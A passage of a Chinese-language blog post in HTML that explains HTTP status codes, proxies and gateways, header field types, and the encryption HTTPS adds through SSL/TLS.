<li>303 See Other &#x8BE5;&#x72B6;&#x6001;&#x7801;&#x8868;&#x793A;&#x7531;&#x4E8E;&#x8BF7;&#x6C42;&#x5BF9;&#x5E94;&#x7684;&#x8D44;&#x6E90;&#x5B58;&#x5728;&#x7740;&#x53E6;&#x4E00;&#x4E2A;URI&#xFF0C;&#x5E94;&#x4F7F;&#x7528;GET&#x65B9;&#x6CD5;&#x5B9A;&#x5411;&#x83B7;&#x53D6;&#x8BF7;&#x6C42;&#x7684;&#x8D44;&#x6E90;&#x3002;303&#x72B6;&#x6001;&#x7801;&#x548C;302 Found&#x72B6;&#x6001;&#x7801;&#x6709;&#x7740;&#x76F8;&#x540C;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x4F46;303&#x72B6;&#x6001;&#x7801;&#x660E;&#x786E;&#x8868;&#x793A;&#x5BA2;&#x6237;&#x7AEF;&#x5E94;&#x5F53;&#x91C7;&#x7528;GET&#x65B9;&#x6CD5;&#x83B7;&#x53D6;&#x8D44;&#x6E90;&#xFF0C;&#x8FD9;&#x70B9;&#x4E0E;302&#x72B6;&#x6001;&#x7801;&#x6709;&#x533A;&#x522B;&#x3002;&#x6BD4;&#x5982;&#xFF0C;&#x5F53;&#x4F7F;&#x7528;POST&#x65B9;&#x6CD5;&#x8BBF;&#x95EE;CGI&#x7A0B;&#x5E8F;&#xFF0C;&#x5176;&#x6267;&#x884C;&#x540E;&#x7684;&#x5904;&#x7406;&#x7ED3;&#x679C;&#x662F;&#x5E0C;&#x671B;&#x5BA2;&#x6237;&#x7AEF;&#x80FD;&#x4EE5;GET&#x65B9;&#x6CD5;&#x91CD;&#x5B9A;&#x5411;&#x5230;&#x53E6;&#x4E00;&#x4E2A;URI&#x4E0A;&#x53BB;&#x65F6;&#xFF0C;&#x8FD4;&#x56DE;303&#x72B6;&#x6001;&#x7801;&#x3002;&#x867D;&#x7136;302 Found&#x72B6;&#x6001;&#x7801;&#x4E5F;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x76F8;&#x540C;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x4F46;&#x8FD9;&#x91CC;&#x4F7F;&#x7528;303&#x72B6;&#x6001;&#x7801;&#x662F;&#x6700;&#x7406;&#x60F3;&#x7684;&#x3002;&#xFFFC;&#x5F53;301&#x3001;302&#x3001;303&#x54CD;&#x5E94;&#x72B6;&#x6001;&#x7801;&#x8FD4;&#x56DE;&#x65F6;&#xFF0C;&#x51E0;&#x4E4E;&#x6240;&#x6709;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x90FD;&#x4F1A;&#x628A;POST&#x6539;&#x6210;GET&#xFF0C;&#x5E76;&#x5220;&#x9664;&#x8BF7;&#x6C42;&#x62A5;&#x6587;&#x5185;&#x7684;&#x4E3B;&#x4F53;&#xFF0C;&#x4E4B;&#x540E;&#x8BF7;&#x6C42;&#x4F1A;&#x81EA;&#x52A8;&#x518D;&#x6B21;&#x53D1;&#x9001;&#x3002;301&#x3001;302&#x6807;&#x51C6;&#x662F;&#x7981;&#x6B62;&#x5C06;POST&#x65B9;&#x6CD5;&#x6539;&#x53D8;&#x6210;GET&#x65B9;&#x6CD5;&#x7684;&#xFF0C;&#x4F46;&#x5B9E;&#x9645;&#x4F7F;&#x7528;&#x65F6;&#x5927;&#x5BB6;&#x90FD;&#x4F1A;&#x8FD9;&#x4E48;&#x505A;&#x3002;</li>
<li>304 Not Modified &#x8BE5;&#x72B6;&#x6001;&#x7801;&#x8868;&#x793A;<u>&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x9001;&#x9644;&#x5E26;&#x6761;&#x4EF6;&#x7684;&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x5141;&#x8BB8;&#x8BF7;&#x6C42;&#x8BBF;&#x95EE;&#x8D44;&#x6E90;&#xFF0C;&#x4F46;&#x56E0;&#x53D1;&#x751F;&#x8BF7;&#x6C42;&#x672A;&#x6EE1;&#x8DB3;&#x6761;&#x4EF6;&#x7684;&#x60C5;&#x51B5;&#x540E;&#xFF0C;&#x76F4;&#x63A5;&#x8FD4;&#x56DE;304 Not Modified</u>&#xFF08;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x8D44;&#x6E90;&#x672A;&#x6539;&#x53D8;&#xFF0C;&#x53EF;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x5BA2;&#x6237;&#x7AEF;&#x672A;&#x8FC7;&#x671F;&#x7684;&#x7F13;&#x5B58;&#xFF09;&#x3002;304&#x72B6;&#x6001;&#x7801;&#x8FD4;&#x56DE;&#x65F6;&#xFF0C;&#x4E0D;&#x5305;&#x542B;&#x4EFB;&#x4F55;&#x54CD;&#x5E94;&#x7684;&#x4E3B;&#x4F53;&#x90E8;&#x5206;&#x3002;<u>304&#x867D;&#x7136;&#x88AB;&#x5212;&#x5206;&#x5728;3XX&#x7C7B;&#x522B;&#x4E2D;&#xFF0C;&#x4F46;&#x662F;&#x548C;&#x91CD;&#x5B9A;&#x5411;&#x6CA1;&#x6709;&#x5173;&#x7CFB;&#x3002;</u></li>
<li><a href="https://stackoverflow.com/questions/2068418/whats-the-difference-between-a-302-and-a-307-redirect">307 Temporary Redirect &#x4E34;&#x65F6;&#x91CD;&#x5B9A;&#x5411;</a>&#x3002;&#x8BE5;&#x72B6;&#x6001;&#x7801;&#x4E0E;302 Found&#x6709;&#x7740;&#x76F8;&#x540C;&#x7684;&#x542B;&#x4E49;&#x3002;&#x5C3D;&#x7BA1;302&#x6807;&#x51C6;&#x7981;&#x6B62;POST&#x53D8;&#x6362;&#x6210;GET&#xFF0C;&#x4F46;&#x5B9E;&#x9645;&#x4F7F;&#x7528;&#x65F6;&#x5927;&#x5BB6;&#x5E76;&#x4E0D;&#x9075;&#x5B88;&#x3002;307&#x4F1A;&#x9075;&#x7167;&#x6D4F;&#x89C8;&#x5668;&#x6807;&#x51C6;&#xFF0C;&#x4E0D;&#x4F1A;&#x4ECE;POST&#x53D8;&#x6210;GET&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x5BF9;&#x4E8E;&#x5904;&#x7406;&#x54CD;&#x5E94;&#x65F6;&#x7684;&#x884C;&#x4E3A;&#xFF0C;&#x6BCF;&#x79CD;&#x6D4F;&#x89C8;&#x5668;&#x6709;&#x53EF;&#x80FD;&#x51FA;&#x73B0;&#x4E0D;&#x540C;&#x7684;&#x60C5;&#x51B5;&#x3002;</li>
</ul>
<h3 id="4xx%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%94%99%E8%AF%AF">4XX&#x5BA2;&#x6237;&#x7AEF;&#x9519;&#x8BEF;</h3>
<ul>
<li>400 Bad Request &#x8BE5;&#x72B6;&#x6001;&#x7801;&#x8868;&#x793A;&#x8BF7;&#x6C42;&#x62A5;&#x6587;&#x4E2D;&#x5B58;&#x5728;&#x8BED;&#x6CD5;&#x9519;&#x8BEF;&#x3002;&#x5F53;&#x9519;&#x8BEF;&#x53D1;&#x751F;&#x65F6;&#xFF0C;&#x9700;&#x4FEE;&#x6539;&#x8BF7;&#x6C42;&#x7684;&#x5185;&#x5BB9;&#x540E;&#x518D;&#x6B21;&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#x3002;</li>
<li>401 Unauthorized &#x8BE5;&#x72B6;&#x6001;&#x7801;&#x8868;&#x793A;&#x53D1;&#x9001;&#x7684;&#x8BF7;&#x6C42;&#x9700;&#x8981;&#x6709;&#x901A;&#x8FC7;HTTP&#x8BA4;&#x8BC1;&#xFF08;BASIC&#x8BA4;&#x8BC1;&#x3001;DIGEST&#x8BA4;&#x8BC1;&#xFF09;&#x7684;&#x8BA4;&#x8BC1;&#x4FE1;&#x606F;&#x3002;&#x53E6;&#x5916;&#x82E5;&#x4E4B;&#x524D;&#x5DF2;&#x8FDB;&#x884C;&#x8FC7;1&#x6B21;&#x8BF7;&#x6C42;&#xFF0C;&#x5219;&#x8868;&#x793A;&#x7528;&#x6237;&#x8BA4;&#x8BC1;&#x5931;&#x8D25;&#x3002;</li>
<li>403 Forbidden &#x8BE5;&#x72B6;&#x6001;&#x7801;&#x8868;&#x660E;&#x5BF9;&#x8BF7;&#x6C42;&#x8D44;&#x6E90;&#x7684;&#x8BBF;&#x95EE;&#x88AB;&#x670D;&#x52A1;&#x5668;&#x62D2;&#x7EDD;&#x4E86;&#x3002;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x6CA1;&#x6709;&#x5FC5;&#x8981;&#x7ED9;&#x51FA;&#x62D2;&#x7EDD;&#x7684;&#x8BE6;&#x7EC6;&#x7406;&#x7531;&#xFF0C;&#x4F46;&#x5982;&#x679C;&#x60F3;&#x4F5C;&#x8BF4;&#x660E;&#x7684;&#x8BDD;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;&#x5B9E;&#x4F53;&#x7684;&#x4E3B;&#x4F53;&#x90E8;&#x5206;&#x5BF9;&#x539F;&#x56E0;&#x8FDB;&#x884C;&#x63CF;&#x8FF0;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x80FD;&#x8BA9;&#x7528;&#x6237;&#x770B;&#x5230;&#x4E86;&#x3002;</li>
<li>404 Not Found &#x8BE5;&#x72B6;&#x6001;&#x7801;&#x8868;&#x660E;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x65E0;&#x6CD5;&#x627E;&#x5230;&#x8BF7;&#x6C42;&#x7684;&#x8D44;&#x6E90;&#x3002;&#x9664;&#x6B64;&#x4E4B;&#x5916;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5728;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x62D2;&#x7EDD;&#x8BF7;&#x6C42;&#x4E14;&#x4E0D;&#x60F3;&#x8BF4;&#x660E;&#x7406;&#x7531;&#x65F6;&#x4F7F;&#x7528;&#x3002;</li>
</ul>
<h3 id="5xx%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%94%99%E8%AF%AF">5XX&#x670D;&#x52A1;&#x5668;&#x9519;&#x8BEF;</h3>
<ul>
<li>500 Internal Server Error &#x8BE5;&#x72B6;&#x6001;&#x7801;&#x8868;&#x660E;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x5728;&#x6267;&#x884C;&#x8BF7;&#x6C42;&#x65F6;&#x53D1;&#x751F;&#x4E86;&#x9519;&#x8BEF;&#x3002;&#x4E5F;&#x6709;&#x53EF;&#x80FD;&#x662F;Web&#x5E94;&#x7528;&#x5B58;&#x5728;&#x7684;bug&#x6216;&#x67D0;&#x4E9B;&#x4E34;&#x65F6;&#x7684;&#x6545;&#x969C;&#x3002;</li>
<li>503 Service Unavailable &#x8BE5;&#x72B6;&#x6001;&#x7801;&#x8868;&#x660E;&#x670D;&#x52A1;&#x5668;&#x6682;&#x65F6;&#x5904;&#x4E8E;&#x8D85;&#x8D1F;&#x8F7D;&#x6216;&#x6B63;&#x5728;&#x8FDB;&#x884C;&#x505C;&#x673A;&#x7EF4;&#x62A4;&#xFF0C;&#x73B0;&#x5728;&#x65E0;&#x6CD5;&#x5904;&#x7406;&#x8BF7;&#x6C42;&#x3002;&#x5982;&#x679C;&#x4E8B;&#x5148;&#x5F97;&#x77E5;&#x89E3;&#x9664;&#x4EE5;&#x4E0A;&#x72B6;&#x51B5;&#x9700;&#x8981;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x6700;&#x597D;&#x5199;&#x5165;Retry-After&#x9996;&#x90E8;&#x5B57;&#x6BB5;&#x518D;&#x8FD4;&#x56DE;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#x3002;</li>
<li>504 Gateway Timeout &#x72B6;&#x6001;&#x7801;&#x8868;&#x793A;&#x4EE3;&#x7406;&#x65E0;&#x6CD5;&#x8FDE;&#x901A;&#x6E90;&#x670D;&#x52A1;&#x5668;&#x518D;&#x6B21;&#x83B7;&#x53D6;&#x6709;&#x6548;&#x8D44;&#x6E90;&#x7684;&#x8BDD;&#xFF0C;&#x7F13;&#x5B58;&#x5FC5;&#x987B;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x4E00;&#x6761;&#x72B6;&#x6001;&#x7801;&#x3002;</li>
</ul>
<h2 id="%E4%B8%8Ehttp%E5%8D%8F%E4%BD%9C%E7%9A%84web%E6%9C%8D%E5%8A%A1%E5%99%A8">&#x4E0E;HTTP&#x534F;&#x4F5C;&#x7684;Web&#x670D;&#x52A1;&#x5668;</h2>
<p>HTTP/1.1&#x89C4;&#x8303;&#x5141;&#x8BB8;&#x4E00;&#x53F0;HTTP&#x670D;&#x52A1;&#x5668;&#x642D;&#x5EFA;&#x591A;&#x4E2A;Web&#x7AD9;&#x70B9;&#x3002;&#x6BD4;&#x5982;&#xFF0C;&#x63D0;&#x4F9B;Web&#x6258;&#x7BA1;&#x670D;&#x52A1;&#xFF08;Web Hosting Service&#xFF09;&#x7684;&#x4F9B;&#x5E94;&#x5546;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x4E3A;&#x591A;&#x4F4D;&#x5BA2;&#x6237;&#x670D;&#x52A1;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x4EE5;&#x6BCF;&#x4F4D;&#x5BA2;&#x6237;&#x6301;&#x6709;&#x7684;&#x57DF;&#x540D;&#x8FD0;&#x884C;&#x5404;&#x81EA;&#x4E0D;&#x540C;&#x7684;&#x7F51;&#x7AD9;&#x3002;&#x5728;&#x76F8;&#x540C;&#x7684;IP&#x5730;&#x5740;&#x4E0B;&#xFF0C;&#x7531;&#x4E8E;&#x865A;&#x62DF;&#x4E3B;&#x673A;&#x53EF;&#x4EE5;&#x5BC4;&#x5B58;&#x591A;&#x4E2A;&#x4E0D;&#x540C;&#x4E3B;&#x673A;&#x540D;&#x548C;&#x57DF;&#x540D;&#x7684;Web&#x7F51;&#x7AD9;&#xFF0C;&#x56E0;&#x6B64;&#x5728;&#x53D1;&#x9001;HTTP&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x5FC5;&#x987B;&#x5728;Host&#x9996;&#x90E8;&#x5185;&#x5B8C;&#x6574;&#x6307;&#x5B9A;&#x4E3B;&#x673A;&#x540D;&#x6216;&#x57DF;&#x540D;&#x7684;URI&#x3002;</p>
<p>HTTP&#x901A;&#x4FE1;&#x65F6;&#xFF0C;&#x9664;&#x5BA2;&#x6237;&#x7AEF;&#x548C;&#x670D;&#x52A1;&#x5668;&#x4EE5;&#x5916;&#xFF0C;&#x8FD8;&#x6709;&#x4E00;&#x4E9B;&#x7528;&#x4E8E;&#x901A;&#x4FE1;&#x6570;&#x636E;&#x8F6C;&#x53D1;&#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#xFF0C;&#x4F8B;&#x5982;&#x4EE3;&#x7406;&#x3001;&#x7F51;&#x5173;&#x548C;&#x96A7;&#x9053;&#x3002;&#x5B83;&#x4EEC;&#x53EF;&#x4EE5;&#x914D;&#x5408;&#x670D;&#x52A1;&#x5668;&#x5DE5;&#x4F5C;&#x3002;&#x8FD9;&#x4E9B;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x548C;&#x670D;&#x52A1;&#x5668;&#x53EF;&#x4EE5;&#x5C06;&#x8BF7;&#x6C42;&#x8F6C;&#x53D1;&#x7ED9;&#x901A;&#x4FE1;&#x7EBF;&#x8DEF;&#x4E0A;&#x7684;&#x4E0B;&#x4E00;&#x7AD9;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x5E76;&#x4E14;&#x80FD;&#x63A5;&#x6536;&#x4ECE;&#x90A3;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x53D1;&#x9001;&#x7684;&#x54CD;&#x5E94;&#x518D;&#x8F6C;&#x53D1;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#x3002;</p>
<p>&#x4EE3;&#x7406;&#x662F;&#x4E00;&#x79CD;&#x6709;&#x8F6C;&#x53D1;&#x529F;&#x80FD;&#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#xFF0C;&#x5B83;&#x626E;&#x6F14;&#x4E86;&#x4F4D;&#x4E8E;&#x670D;&#x52A1;&#x5668;&#x548C;&#x5BA2;&#x6237;&#x7AEF;&#x201C;&#x4E2D;&#x95F4;&#x4EBA;&#x201D;&#x7684;&#x89D2;&#x8272;&#xFF0C;&#x63A5;&#x6536;&#x7531;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x9001;&#x7684;&#x8BF7;&#x6C42;&#x5E76;&#x8F6C;&#x53D1;&#x7ED9;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x540C;&#x65F6;&#x4E5F;&#x63A5;&#x6536;&#x670D;&#x52A1;&#x5668;&#x8FD4;&#x56DE;&#x7684;&#x54CD;&#x5E94;&#x5E76;&#x8F6C;&#x53D1;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#x3002;&#x7F51;&#x5173;&#x662F;&#x8F6C;&#x53D1;&#x5176;&#x4ED6;&#x670D;&#x52A1;&#x5668;&#x901A;&#x4FE1;&#x6570;&#x636E;&#x7684;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x63A5;&#x6536;&#x4ECE;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x9001;&#x6765;&#x7684;&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x5B83;&#x5C31;&#x50CF;&#x81EA;&#x5DF1;&#x62E5;&#x6709;&#x8D44;&#x6E90;&#x7684;&#x6E90;&#x670D;&#x52A1;&#x5668;&#x4E00;&#x6837;&#x5BF9;&#x8BF7;&#x6C42;&#x8FDB;&#x884C;&#x5904;&#x7406;&#x3002;&#x6709;&#x65F6;&#x5BA2;&#x6237;&#x7AEF;&#x53EF;&#x80FD;&#x90FD;&#x4E0D;&#x4F1A;&#x5BDF;&#x89C9;&#xFF0C;&#x81EA;&#x5DF1;&#x7684;&#x901A;&#x4FE1;&#x76EE;&#x6807;&#x662F;&#x4E00;&#x4E2A;&#x7F51;&#x5173;&#x3002;&#x96A7;&#x9053;&#x662F;&#x5728;&#x76F8;&#x9694;&#x751A;&#x8FDC;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x548C;&#x670D;&#x52A1;&#x5668;&#x4E24;&#x8005;&#x4E4B;&#x95F4;&#x8FDB;&#x884C;&#x4E2D;&#x8F6C;&#xFF0C;&#x5E76;&#x4FDD;&#x6301;&#x53CC;&#x65B9;&#x901A;&#x4FE1;&#x8FDE;&#x63A5;&#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#xFF0C;&#x76EE;&#x7684;&#x662F;&#x786E;&#x4FDD;&#x5BA2;&#x6237;&#x7AEF;&#x80FD;&#x4E0E;&#x670D;&#x52A1;&#x5668;&#x8FDB;&#x884C;&#x5B89;&#x5168;&#x7684;&#x901A;&#x4FE1;&#x3002;</p>
<h2 id="http%E9%A6%96%E9%83%A8">HTTP&#x9996;&#x90E8;</h2>
<p>HTTP&#x534F;&#x8BAE;&#x7684;&#x8BF7;&#x6C42;&#x548C;&#x54CD;&#x5E94;&#x62A5;&#x6587;&#x4E2D;&#x5FC5;&#x5B9A;&#x5305;&#x542B;HTTP&#x9996;&#x90E8;&#x3002;&#x9996;&#x90E8;&#x5185;&#x5BB9;&#x4E3A;&#x5BA2;&#x6237;&#x7AEF;&#x548C;&#x670D;&#x52A1;&#x5668;&#x5206;&#x522B;&#x5904;&#x7406;&#x8BF7;&#x6C42;&#x548C;&#x54CD;&#x5E94;&#x63D0;&#x4F9B;&#x6240;&#x9700;&#x8981;&#x7684;&#x4FE1;&#x606F;&#x3002;&#x5BF9;&#x4E8E;&#x5BA2;&#x6237;&#x7AEF;&#x7528;&#x6237;&#x6765;&#x8BF4;&#xFF0C;&#x8FD9;&#x4E9B;&#x4FE1;&#x606F;&#x4E2D;&#x7684;&#x5927;&#x90E8;&#x5206;&#x5185;&#x5BB9;&#x90FD;&#x65E0;&#x987B;&#x4EB2;&#x81EA;&#x67E5;&#x770B;&#x3002;</p>
<p>HTTP&#x9996;&#x90E8;&#x5B57;&#x6BB5;&#x662F;&#x7531;&#x9996;&#x90E8;&#x5B57;&#x6BB5;&#x540D;&#x548C;&#x5B57;&#x6BB5;&#x503C;&#x6784;&#x6210;&#x7684;&#xFF0C;&#x4E2D;&#x95F4;&#x7528;&#x5192;&#x53F7; &quot;:&quot; &#x5206;&#x9694;&#x3002;</p>
<pre><code class="language-javascript">// &#x9996;&#x90E8;&#x5B57;&#x6BB5;&#x540D;&#xFF1A; &#x5B57;&#x6BB5;&#x503C;
Content-Type: text/html // &#x62A5;&#x6587;&#x4E3B;&#x4F53;&#x7684;&#x5BF9;&#x8C61;&#x7C7B;&#x578B;
Keep-Alive: timeout=15, max=100...
</code></pre>
<p>HTTP&#x9996;&#x90E8;&#x5B57;&#x6BB5;&#x6839;&#x636E;&#x5B9E;&#x9645;&#x7528;&#x9014;&#x88AB;&#x5206;&#x4E3A;&#x4EE5;&#x4E0B;4&#x79CD;&#x7C7B;&#x578B;&#x3002;<br>
&#x901A;&#x7528;&#x9996;&#x90E8;&#x5B57;&#x6BB5; General Header Fields &#x8BF7;&#x6C42;&#x62A5;&#x6587;&#x548C;&#x54CD;&#x5E94;&#x62A5;&#x6587;&#x4E24;&#x65B9;&#x90FD;&#x4F1A;&#x4F7F;&#x7528;&#x7684;&#x9996;&#x90E8;&#x3002;</p>
<p><img src="https://www.zairesinatra.com/content/images/2021/12/Common-header-field.png" alt="&#x56FE;&#x89E3; HTTP &#x6458;&#x8981;" loading="lazy"></p>
<p>&#x8BF7;&#x6C42;&#x9996;&#x90E8;&#x5B57;&#x6BB5; Request Header Fields &#x4ECE;&#x5BA2;&#x6237;&#x7AEF;&#x5411;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#x62A5;&#x6587;&#x65F6;&#x4F7F;&#x7528;&#x7684;&#x9996;&#x90E8;&#x3002;&#x8865;&#x5145;&#x4E86;&#x8BF7;&#x6C42;&#x7684;&#x9644;&#x52A0;&#x5185;&#x5BB9;&#x3001;&#x5BA2;&#x6237;&#x7AEF;&#x4FE1;&#x606F;&#x3001;&#x54CD;&#x5E94;&#x5185;&#x5BB9;&#x76F8;&#x5173;&#x4F18;&#x5148;&#x7EA7;&#x7B49;&#x4FE1;&#x606F;&#x3002;</p>
<p><img src="https://www.zairesinatra.com/content/images/2021/12/Request-header-field.png" alt="&#x56FE;&#x89E3; HTTP &#x6458;&#x8981;" loading="lazy"></p>
<p>&#x54CD;&#x5E94;&#x9996;&#x90E8;&#x5B57;&#x6BB5; Response Header Fields &#x4ECE;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x5411;&#x5BA2;&#x6237;&#x7AEF;&#x8FD4;&#x56DE;&#x54CD;&#x5E94;&#x62A5;&#x6587;&#x65F6;&#x4F7F;&#x7528;&#x7684;&#x9996;&#x90E8;&#x3002;&#x8865;&#x5145;&#x4E86;&#x54CD;&#x5E94;&#x7684;&#x9644;&#x52A0;&#x5185;&#x5BB9;&#xFF0C;&#x4E5F;&#x4F1A;&#x8981;&#x6C42;&#x5BA2;&#x6237;&#x7AEF;&#x9644;&#x52A0;&#x989D;&#x5916;&#x7684;&#x5185;&#x5BB9;&#x4FE1;&#x606F;&#x3002;</p>
<p><img src="https://www.zairesinatra.com/content/images/2021/12/Response-header-field.png" alt="&#x56FE;&#x89E3; HTTP &#x6458;&#x8981;" loading="lazy"></p>
<p>&#x5B9E;&#x4F53;&#x9996;&#x90E8;&#x5B57;&#x6BB5; Entity Header Fields &#x9488;&#x5BF9;&#x8BF7;&#x6C42;&#x62A5;&#x6587;&#x548C;&#x54CD;&#x5E94;&#x62A5;&#x6587;&#x7684;&#x5B9E;&#x4F53;&#x90E8;&#x5206;&#x4F7F;&#x7528;&#x7684;&#x9996;&#x90E8;&#x3002;&#x8865;&#x5145;&#x4E86;&#x8D44;&#x6E90;&#x5185;&#x5BB9;&#x66F4;&#x65B0;&#x65F6;&#x95F4;&#x7B49;&#x4E0E;&#x5B9E;&#x4F53;&#x6709;&#x5173;&#x7684;&#x4FE1;&#x606F;&#x3002;</p>
<p><img src="https://www.zairesinatra.com/content/images/2021/12/Entity-header-field.png" alt="&#x56FE;&#x89E3; HTTP &#x6458;&#x8981;" loading="lazy"></p>
<p>&#x5728;HTTP&#x534F;&#x8BAE;&#x901A;&#x4FE1;&#x4EA4;&#x4E92;&#x4E2D;&#x4F7F;&#x7528;&#x5230;&#x7684;&#x9996;&#x90E8;&#x5B57;&#x6BB5;&#xFF0C;&#x4E0D;&#x9650;&#x4E8E;RFC2616&#x4E2D;&#x5B9A;&#x4E49;&#x7684;47&#x79CD;&#x9996;&#x90E8;&#x5B57;&#x6BB5;&#x3002;&#x8FD8;&#x6709;Cookie&#x3001;Set-Cookie&#x548C;Content-Disposition&#x7B49;&#x5728;&#x5176;&#x4ED6;RFC&#x4E2D;&#x5B9A;&#x4E49;&#x7684;&#x9996;&#x90E8;&#x5B57;&#x6BB5;&#xFF0C;&#x5B83;&#x4EEC;&#x7684;&#x4F7F;&#x7528;&#x9891;&#x7387;&#x4E5F;&#x5F88;&#x9AD8;&#x3002;<br>
&#x8FD9;&#x4E9B;&#x975E;&#x6B63;&#x5F0F;&#x7684;&#x9996;&#x90E8;&#x5B57;&#x6BB5;&#x7EDF;&#x4E00;&#x5F52;&#x7EB3;&#x5728;RFC4229 HTTP Header Field Registrations&#x4E2D;&#x3002;</p>
<h2 id="%E7%A1%AE%E4%BF%9Dweb%E5%AE%89%E5%85%A8%E7%9A%84https">&#x786E;&#x4FDD;Web&#x5B89;&#x5168;&#x7684;HTTPS</h2>
<p>&#x901A;&#x4FE1;&#x4F7F;&#x7528;&#x660E;&#x6587;&#xFF08;&#x4E0D;&#x52A0;&#x5BC6;&#xFF09;&#xFF0C;&#x5185;&#x5BB9;&#x53EF;&#x80FD;&#x4F1A;&#x88AB;&#x7A83;&#x542C;&#xFF1B;&#x4E0D;&#x9A8C;&#x8BC1;&#x901A;&#x4FE1;&#x65B9;&#x7684;&#x8EAB;&#x4EFD;&#xFF0C;&#x56E0;&#x6B64;&#x6709;&#x53EF;&#x80FD;&#x906D;&#x9047;&#x4F2A;&#x88C5;&#xFF1B;&#x65E0;&#x6CD5;&#x8BC1;&#x660E;&#x62A5;&#x6587;&#x7684;&#x5B8C;&#x6574;&#x6027;&#xFF0C;&#x6240;&#x4EE5;&#x6709;&#x53EF;&#x80FD;&#x5DF2;&#x906D;&#x7BE1;&#x6539;&#x3002;&#x8FD9;&#x4E9B;&#x90FD;&#x662F;HTTP&#x7684;&#x4E0D;&#x8DB3;&#xFF0C;&#x540C;&#x7406;&#x5176;&#x4ED6;&#x672A;&#x52A0;&#x5BC6;&#x7684;&#x534F;&#x8BAE;&#x4E2D;&#x4E5F;&#x4F1A;&#x5B58;&#x5728;&#x8FD9;&#x7C7B;&#x95EE;&#x9898;&#x3002;</p>
<ul>
<li>&#x901A;&#x4FE1;&#x7684;&#x52A0;&#x5BC6;</li>
</ul>
<p>HTTP&#x534F;&#x8BAE;&#x4E2D;&#x6CA1;&#x6709;&#x52A0;&#x5BC6;&#x673A;&#x5236;&#xFF0C;&#x4F46;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x548C;SSL&#xFF08;Secure Socket Layer&#xFF0C;&#x5B89;&#x5168;&#x5957;&#x63A5;&#x5C42;&#xFF09;&#x6216;TLS&#xFF08;Transport Layer Security&#xFF0C;&#x5B89;&#x5168;&#x4F20;&#x8F93;&#x5C42;&#x534F;&#x8BAE;&#xFF09;&#x7684;&#x7EC4;&#x5408;&#x4F7F;&#x7528;&#xFF0C;&#x52A0;&#x5BC6;HTTP&#x7684;&#x901A;&#x4FE1;&#x5185;&#x5BB9;&#x3002;&#x7528;SSL&#x5EFA;&#x7ACB;&#x5B89;&#x5168;&#x901A;&#x4FE1;&#x7EBF;&#x8DEF;&#x4E4B;&#x540E;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5728;&#x8FD9;&#x6761;&#x7EBF;&#x8DEF;&#x4E0A;&#x8FDB;&#x884C;HTTP&#x901A;&#x4FE1;&#x4E86;&#x3002;&#x4E0E;SSL&#x7EC4;&#x5408;&#x4F7F;&#x7528;&#x7684;HTTP&#x88AB;&#x79F0;&#x4E3A;HTTPS&#xFF08;HTTP Secure&#xFF0C;&#x8D85;&#x6587;&#x672C;&#x4F20;&#x8F93;&#x5B89;&#x5168;&#x534F;&#x8BAE;&#xFF09;&#x6216;HTTP over SSL&#x3002;</p>
<ul>
<li>&#x5185;&#x5BB9;&#x7684;&#x52A0;&#x5BC6;</li>
</ul>
